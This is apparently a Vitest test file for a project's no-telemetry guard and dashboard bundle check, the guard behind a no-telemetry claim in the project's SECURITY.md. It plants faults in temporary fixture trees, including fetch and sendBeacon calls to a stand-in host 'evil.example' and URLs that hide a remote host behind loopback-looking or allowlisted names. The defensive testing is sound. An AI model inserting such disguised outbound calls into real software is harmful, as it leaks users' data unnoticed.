import { describe, it, expect, afterAll } from 'vitest'
import { execFile } from 'node:child_process'
import {
  appendFileSync,
  cpSync,
  existsSync,
  mkdtempSync,
  mkdirSync,
  readdirSync,
  writeFileSync,
  rmSync,
} from 'node:fs'
import { join, dirname } from 'node:path'
import { tmpdir } from 'node:os'

/**
 * Self-tests for scripts/check-no-telemetry.mjs, the guard behind the
 * no-telemetry claim in SECURITY.md (#401). Each test builds a throwaway
 * fixture tree and spawns the guard with `--repo-root` pointed at it, so
 * every failure class the guard exists to catch has been SEEN failing at
 * least once: a non-loopback literal, each way of smuggling a remote host
 * past a loopback check, a stale allowlist row, each import form of a
 * network-shaped module, an outbound call site in an unlisted file, and a
 * tsup setting that would bundle a dependency's URLs into dist/cli.js.
 */

const REPO_ROOT = join(import.meta.dirname, '../../..')
const GUARD_PATH = join(REPO_ROOT, 'scripts/check-no-telemetry.mjs')

const fixtureRoots: string[] = []

afterAll(() => {
  for (const root of fixtureRoots) {
    rmSync(root, { recursive: true, force: true })
  }
})

/** The tsup config shape that keeps every dependency out of dist/cli.js. */
const CLEAN_TSUP = [
  "import { defineConfig } from 'tsup'",
  '',
  'export default defineConfig([',
  "  { entry: ['src/index.ts'], format: ['esm'], external: ['better-sqlite3'] },",
  '])',
  '',
].join('\n')

/** A shipped proxy module that opens nothing. */
const CLEAN_MODULE = [
  "import { readFileSync } from 'node:fs'",
  '',
  'export function load(path: string): string {',
  "  return readFileSync(path, 'utf-8')",
  '}',
  '',
].join('\n')

/**
 * Write a fixture tree into a fresh temp dir and return its root. Every tree
 * carries a clean tsup config and an empty allowlist unless the test
 * overrides them, so a test plants exactly the fault it is about.
 */
function makeTree(files: Record<string, string | Buffer>): string {
  const root = mkdtempSync(join(tmpdir(), 'helio-no-telemetry-fixture-'))
  fixtureRoots.push(root)
  const withDefaults: Record<string, string | Buffer> = {
    'packages/proxy/tsup.config.ts': CLEAN_TSUP,
    'scripts/no-telemetry-allowlist.txt': '',
    'packages/proxy/src/util/clean.ts': CLEAN_MODULE,
    ...files,
  }
  for (const [rel, content] of Object.entries(withDefaults)) {
    const abs = join(root, rel)
    mkdirSync(dirname(abs), { recursive: true })
    writeFileSync(abs, content)
  }
  return root
}

/** Run the guard against a repo root and capture combined output. */
function runGuard(repoRoot?: string): Promise<{ code: number; output: string }> {
  const args = repoRoot === undefined ? [GUARD_PATH] : [GUARD_PATH, '--repo-root', repoRoot]
  return new Promise((resolve) => {
    execFile('node', args, (error, stdout, stderr) => {
      resolve({
        code: typeof error?.code === 'number' ? error.code : error ? 1 : 0,
        output: `${stdout}\n${stderr}`,
      })
    })
  })
}

/** One shipped module whose only literal is `url`. */
function moduleWith(url: string): string {
  return `export const target = '${url}'\n`
}

/** The allowlist row for the init scaffold's printed docs link. */
const DOCS_ROW =
  'packages/proxy/src/cli.ts\thttps://github.com/gethelio/helio\tdocs comment in the init scaffold\n'

describe('no-telemetry guard: literals', () => {
  it('passes a clean tree and skips test files', async () => {
    const root = makeTree({
      'packages/proxy/src/demo/config.ts': moduleWith('http://127.0.0.1:3100'),
      'packages/dashboard/src/api.ts': "export const base = 'http://localhost:3100'\n",
      'packages/python-sdk/src/helio/client.py': 'PROXY_URL = "http://127.0.0.1:3200"\n',
      'packages/proxy/src/policy/engine.test.ts': moduleWith('https://evil.example/collect'),
      'packages/proxy/src/__tests__/helper.ts': moduleWith('https://evil.example/collect'),
      'packages/python-sdk/tests/test_x.py': 'URL = "https://evil.example/collect"\n',
    })
    const { code, output } = await runGuard(root)
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })

  it('names a planted non-loopback literal with its path and line', async () => {
    const root = makeTree({
      'packages/proxy/src/policy/engine.ts': `${CLEAN_MODULE}\nexport const sink = 'https://evil.example/collect'\n`,
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/policy/engine.ts:7')
    expect(output).toContain('https://evil.example/collect')
  })

  const attacks: ReadonlyArray<readonly [string, string]> = [
    ['userinfo before a loopback host', 'https://127.0.0.1@evil.example/collect'],
    ['a loopback name as a subdomain', 'http://localhost.evil.example/x'],
    ['an IPv6 literal', 'http://[2001:db8::1]/x'],
    ['a template in the port of a remote host', 'https://evil.example:${port}/collect'],
    ['a template in the query of a remote host', 'https://evil.example?x=${id}'],
    ['a template in the fragment of a remote host', 'https://evil.example#${id}'],
    ['a template in the path of a remote host', 'https://evil.example/${id}'],
  ]

  for (const [label, url] of attacks) {
    it(`fails ${label}: ${url}`, async () => {
      const root = makeTree({
        'packages/proxy/src/policy/engine.ts': `export const sink = \`${url}\`\n`,
      })
      const { code, output } = await runGuard(root)
      expect(code).toBe(1)
      expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/policy/engine.ts:1')
      expect(output).toContain(url)
    })
  }

  it('passes a template whose authority is empty or a loopback host and colon', async () => {
    const root = makeTree({
      'packages/proxy/src/policy/engine.ts': [
        // prettier-ignore
        "export const a = `http://${HOST}/collect`",
        // prettier-ignore
        "export const b = `http://127.0.0.1:${String(p)}/x`",
        '',
      ].join('\n'),
    })
    const { code, output } = await runGuard(root)
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })

  it('fails a docs-URL prefix in a file whose row allows only the exact docs URL', async () => {
    const root = makeTree({
      'scripts/no-telemetry-allowlist.txt': DOCS_ROW,
      'packages/proxy/src/cli.ts': [
        '// # Docs: https://github.com/gethelio/helio',
        '// # Docs: https://github.com/gethelio/helio-telemetry',
        '',
      ].join('\n'),
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/cli.ts:2')
    expect(output).toContain('https://github.com/gethelio/helio-telemetry')
  })

  it('fails a second URL beside an allowlisted docs URL on one line', async () => {
    const root = makeTree({
      'scripts/no-telemetry-allowlist.txt': DOCS_ROW,
      'packages/proxy/src/cli.ts':
        '// # Docs: https://github.com/gethelio/helio and https://evil.example/collect\n',
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/cli.ts:1')
    expect(output).toContain('https://evil.example/collect')
  })

  it('passes an allowlisted docs URL that is ended by a backslash or a space', async () => {
    const root = makeTree({
      'scripts/no-telemetry-allowlist.txt': DOCS_ROW,
      'packages/proxy/src/cli.ts': [
        "export const header = 'Docs: https://github.com/gethelio/helio\\n'",
        '// # Docs: https://github.com/gethelio/helio',
        '',
      ].join('\n'),
    })
    const { code, output } = await runGuard(root)
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })

  it('names a stale allowlist row', async () => {
    const root = makeTree({
      'scripts/no-telemetry-allowlist.txt': DOCS_ROW,
      'packages/proxy/src/cli.ts': moduleWith('http://127.0.0.1:3100'),
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: scripts/no-telemetry-allowlist.txt:1')
    expect(output).toContain('packages/proxy/src/cli.ts')
    expect(output).toContain('matches nothing')
  })

  it('names a row whose file is outside the corpus', async () => {
    const root = makeTree({
      'scripts/no-telemetry-allowlist.txt':
        'packages/proxy/src/cli.test.ts\thttps://github.com/gethelio/helio\tmisfiled\n',
      'packages/proxy/src/cli.test.ts': moduleWith('https://github.com/gethelio/helio'),
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: scripts/no-telemetry-allowlist.txt:1')
  })

  it('skips bytecode under __pycache__ because the walk is by extension', async () => {
    const root = makeTree({
      'packages/python-sdk/src/helio/client.py': 'PROXY_URL = "http://127.0.0.1:3200"\n',
      'packages/python-sdk/src/helio/__pycache__/client.cpython-312.pyc': Buffer.concat([
        Buffer.from('http://127.0.0.1:3200'),
        Buffer.from([0, 0, 0, 1, 2]),
      ]),
    })
    const { code, output } = await runGuard(root)
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })
})

describe('no-telemetry guard: imports and call sites', () => {
  const imports: ReadonlyArray<readonly [string, string, string]> = [
    [
      'a static import',
      'packages/proxy/src/audit/store.ts',
      "import { request } from 'node:https'",
    ],
    [
      'a type-only import',
      'packages/proxy/src/audit/store.ts',
      "import type { Agent } from 'node:http'",
    ],
    ['a bare import', 'packages/proxy/src/audit/store.ts', "import 'node:http'"],
    ['a dynamic import', 'packages/proxy/src/audit/store.ts', "const u = await import('undici')"],
    ['a require call', 'packages/proxy/src/audit/store.ts', "const dns = require('node:dns')"],
    [
      'a prefix-less module name',
      'packages/proxy/src/audit/store.ts',
      "import { connect } from 'tls'",
    ],
    [
      'child_process outside the stdio wrapper',
      'packages/proxy/src/policy/engine.ts',
      "import { spawn } from 'node:child_process'",
    ],
    [
      'worker_threads anywhere',
      'packages/proxy/src/transport/stdio-wrapper.ts',
      "import { Worker } from 'worker_threads'",
    ],
    [
      'a backtick-quoted dynamic import',
      'packages/proxy/src/audit/store.ts',
      'const h = await import(`node:http`)',
    ],
    [
      'a subpath of a network module',
      'packages/proxy/src/audit/store.ts',
      "import { lookup } from 'node:dns/promises'",
    ],
    ['http2', 'packages/proxy/src/audit/store.ts', "import http2 from 'node:http2'"],
    [
      'a subpath in a file whose exception names the bare module',
      'packages/proxy/src/demo/upstream.ts',
      "import { request } from 'node:http/foo'",
    ],
  ]

  for (const [label, path, line] of imports) {
    it(`names ${label}`, async () => {
      const root = makeTree({ [path]: `${line}\n` })
      const { code, output } = await runGuard(root)
      expect(code).toBe(1)
      expect(output).toContain(`NO-TELEMETRY FAIL: ${path}:1`)
      expect(output).toContain(line.trim())
    })
  }

  it('allows the three named exceptions', async () => {
    const root = makeTree({
      'packages/proxy/src/demo/upstream.ts': "import { createServer } from 'node:http'\n",
      'packages/proxy/src/server.ts': "import type { Socket } from 'node:net'\n",
      'packages/proxy/src/transport/stdio-wrapper.ts': [
        "import { spawn } from 'node:child_process'",
        "import type { ChildProcess } from 'node:child_process'",
        '',
      ].join('\n'),
    })
    const { code, output } = await runGuard(root)
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })

  it('names a fetch call in a file that is not on the call-site list', async () => {
    const root = makeTree({
      'packages/proxy/src/policy/engine.ts':
        "export const r = await fetch('http://127.0.0.1:1/x')\n",
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/policy/engine.ts:1')
    expect(output).toContain('fetch(')
  })

  it('names a Slack client constructed outside approval/slack.ts', async () => {
    const root = makeTree({
      'packages/proxy/src/approval/webhook.ts': 'export const c = new WebClient(token)\n',
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/src/approval/webhook.ts:1')
    expect(output).toContain('new WebClient(')
  })
})

describe('no-telemetry guard: bundling', () => {
  it('fails a tsup config that sets noExternal', async () => {
    const root = makeTree({
      'packages/proxy/tsup.config.ts': CLEAN_TSUP.replace(
        "external: ['better-sqlite3']",
        "external: ['better-sqlite3'], noExternal: ['@slack/web-api']",
      ),
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/tsup.config.ts:4')
    expect(output).toContain('noExternal')
  })

  it('fails a tsup config that sets skipNodeModulesBundle: false', async () => {
    const root = makeTree({
      'packages/proxy/tsup.config.ts': CLEAN_TSUP.replace(
        "external: ['better-sqlite3']",
        "external: ['better-sqlite3'], skipNodeModulesBundle: false",
      ),
    })
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/tsup.config.ts:4')
    expect(output).toContain('skipNodeModulesBundle')
  })

  it('fails when the tsup config is missing', async () => {
    const root = makeTree({})
    rmSync(join(root, 'packages/proxy/tsup.config.ts'))
    const { code, output } = await runGuard(root)
    expect(code).toBe(1)
    expect(output).toContain('NO-TELEMETRY FAIL: packages/proxy/tsup.config.ts')
  })
})

describe('no-telemetry guard: dashboard bundle (check-dashboard-assets.ts)', () => {
  const PROXY_DIR = join(import.meta.dirname, '..')
  const BUNDLE_CHECK = join(PROXY_DIR, 'scripts/check-dashboard-assets.ts')
  const TSX = join(PROXY_DIR, 'node_modules/.bin/tsx')
  const REAL_BUNDLE = join(PROXY_DIR, 'dist/dashboard-assets')

  /** Run the build-time bundle check against a bundle directory. */
  function runBundleCheck(distDir?: string): Promise<{ code: number; output: string }> {
    const args = distDir === undefined ? [BUNDLE_CHECK] : [BUNDLE_CHECK, '--dist-dir', distDir]
    return new Promise((resolve) => {
      execFile(TSX, args, (error, stdout, stderr) => {
        resolve({
          code: typeof error?.code === 'number' ? error.code : error ? 1 : 0,
          output: `${stdout}\n${stderr}`,
        })
      })
    })
  }

  /** Copy the real bundle into a temp dir and return the copy plus its one JS and CSS file. */
  function copyBundle(): { dir: string; js: string; css: string } {
    if (!existsSync(REAL_BUNDLE)) {
      throw new Error(`Built dashboard bundle not found at ${REAL_BUNDLE}; run pnpm build first`)
    }
    const dir = mkdtempSync(join(tmpdir(), 'helio-bundle-fixture-'))
    fixtureRoots.push(dir)
    cpSync(REAL_BUNDLE, dir, { recursive: true })
    const assets = readdirSync(join(dir, 'assets'))
    const js = assets.find((name) => name.endsWith('.js'))
    const css = assets.find((name) => name.endsWith('.css'))
    if (js === undefined || css === undefined)
      throw new Error('bundle copy lacks a js or css asset')
    return { dir, js: join(dir, 'assets', js), css: join(dir, 'assets', css) }
  }

  it('passes the real bundle', { timeout: 30_000 }, async () => {
    const { code, output } = await runBundleCheck()
    expect(output).toContain('Verified bundled dashboard assets')
    expect(code).toBe(0)
  })

  it('names a JS file carrying a fetch of a remote URL', { timeout: 30_000 }, async () => {
    const { dir, js } = copyBundle()
    appendFileSync(js, '\nfetch("https://evil.example/collect");\n')
    const { code, output } = await runBundleCheck(dir)
    expect(code).toBe(1)
    expect(output).toContain(js)
    expect(output).toContain('https://evil.example/collect')
  })

  it('names a JS file carrying a sendBeacon call', { timeout: 30_000 }, async () => {
    const { dir, js } = copyBundle()
    appendFileSync(js, '\nnavigator.sendBeacon("/x");\n')
    const { code, output } = await runBundleCheck(dir)
    expect(code).toBe(1)
    expect(output).toContain(js)
    expect(output).toContain('sendBeacon')
  })

  it(
    'names a JS literal that hides a remote host behind userinfo',
    { timeout: 30_000 },
    async () => {
      const { dir, js } = copyBundle()
      appendFileSync(js, '\nfetch("https://tailwindcss.com@evil.example/collect");\n')
      const { code, output } = await runBundleCheck(dir)
      expect(code).toBe(1)
      expect(output).toContain(js)
      expect(output).toContain('https://tailwindcss.com@evil.example/collect')
    },
  )

  it('names a JS literal with an IPv6 host', { timeout: 30_000 }, async () => {
    const { dir, js } = copyBundle()
    appendFileSync(js, '\nfetch("http://[2001:db8::1]/x");\n')
    const { code, output } = await runBundleCheck(dir)
    expect(code).toBe(1)
    expect(output).toContain(js)
    expect(output).toContain('http://[2001:db8::1]/x')
  })

  it('names a CSS file whose literal extends an allowed host', { timeout: 30_000 }, async () => {
    const { dir, css } = copyBundle()
    appendFileSync(css, '\n/* https://tailwindcss.com.evil.example/x */\n')
    const { code, output } = await runBundleCheck(dir)
    expect(code).toBe(1)
    expect(output).toContain(css)
    expect(output).toContain('https://tailwindcss.com.evil.example/x')
  })
})

describe('no-telemetry guard: this repository', () => {
  it('passes on the real source trees and allowlist', { timeout: 30_000 }, async () => {
    const { code, output } = await runGuard()
    expect(output).toContain('NO-TELEMETRY OK')
    expect(code).toBe(0)
  })
})
